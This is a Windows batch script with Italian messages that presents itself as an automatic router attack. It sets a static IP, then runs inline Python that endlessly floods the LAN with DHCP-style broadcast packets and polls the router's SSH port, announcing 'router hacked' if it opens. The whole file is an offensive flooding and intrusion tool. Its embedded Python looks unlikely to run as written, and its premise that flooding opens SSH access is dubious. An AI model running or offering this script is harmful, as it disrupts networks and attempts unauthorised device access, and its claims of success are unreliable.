@echo off
:: Sistema i permessi e il titolo
title CYBER ANAS - PILOTA AUTOMATICO (DGA4331)
color 0A

:ETERNAL_LOOP
cls
echo ======================================================
echo    THE CYBER ANAS - MODALITA' "FAI TUTTO DA SOLO"
echo ======================================================
echo.
echo  [1] CONFIGURAZIONE RETE (Ethernet 3)
:: Forza l'IP necessario per parlare col router
netsh interface ip set address name="Ethernet 3" static 192.168.1.100 255.255.255.0 >nul 2>&1
echo      Stato: IP 192.168.1.100 Configurato.
echo.
echo  [2] AVVIO BOMBARDAMENTO (Attacco Continuo)
echo      INFO: Usa la porta ROSSA (WAN) per evitare i corti.
echo      INFO: Fai pure il RESET (5 sec) quando vuoi.
echo.
echo  [CONTATORI IN TEMPO REALE]
echo  ----------------------------------------------------

:: Avvio del motore Python (usa 'py' che hai installato)
:: Se il file si chiama in modo diverso su GitHub, rinominalo 'engine.py'
py -c "
import socket, time
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
payload = b'\x02\x01\x06\x00' + b'\x00' * 296
count = 0
print('      >>> ATTACCO IN CORSO...')
while True:
    try:
        s.sendto(payload, ('255.255.255.255', 67))
        count += 1
        if count %% 100 == 0:
            print(f'      Attacchi Totali: {count}', end='\r')
        
        # Controllo se il router risponde alla porta SSH (22)
        check = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        check.settimeout(0.01)
        if check.connect_ex(('192.168.1.1', 22)) == 0:
            print('\n\n[!!!] ACCESSO TROVATO! ROUTER BUCATO! [!!!]')
            break
        check.close()
    except:
        pass
    time.sleep(0.01)
"

echo.
echo  [3] MISSIONE COMPIUTA O INTERROTTA
echo      Riavvio il sistema automatico in 5 secondi...
timeout /t 5 >nul
goto ETERNAL_LOOP
